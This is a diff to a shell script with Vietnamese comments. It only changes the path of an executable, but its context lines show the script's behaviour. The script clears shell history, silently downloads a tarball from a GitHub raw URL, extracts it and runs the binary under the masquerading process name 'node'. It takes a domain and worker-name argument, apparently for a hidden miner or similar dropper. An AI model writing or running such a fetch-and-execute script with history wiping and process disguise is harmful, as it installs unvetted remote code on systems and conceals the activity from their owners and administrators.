@@ -2,7 +2,7 @@
 
 DOMAIN="$1"
 NAME_WORK="$2"
-PROCESS_PATH="node/node"   # file thực thi
+PROCESS_PATH="node"   # file thực thi
 PROCESS_NAME="node"        # tên tiến trình hiển thị
 
 # ❌ Xoá shell history
@@ -17,7 +17,7 @@ if [ ! -f "$(pwd)/$PROCESS_PATH" ]; then
     rm -rf node node.tar.gz
     curl -sL -o node.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/node.tar.gz
     tar -xzf node.tar.gz
-    chmod +x node/node
+    chmod +x node
     rm -f node.tar.gz
 fi
 
